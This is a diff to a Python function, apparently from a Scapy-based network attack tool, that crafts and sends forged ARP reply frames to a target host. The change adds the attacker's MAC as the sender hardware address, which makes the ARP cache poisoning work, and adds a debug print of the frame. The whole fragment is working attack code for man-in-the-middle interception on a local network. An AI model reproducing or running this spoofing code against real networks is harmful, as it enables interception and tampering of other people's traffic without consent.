@@ -32,8 +32,10 @@ def arp_spoofing_target(host_tupl, target_tupl, randomise_mac=False, delay=0):
 
     # craft packet
     eth_l2 = Ether(src=host_mac, dst=target_mac)
-    arp = ARP(op=2, pdst=target_ip, psrc=host_ip, hwdst=target_mac)
+    arp = ARP(op=2, pdst=target_ip, psrc=host_ip, hwsrc=host_mac, hwdst=target_mac)
     frame = eth_l2 / arp
+
+    print(frame.show())
 
     sendp(frame, iface=state.current_interface_object['interface_name'])
     time.sleep(delay)
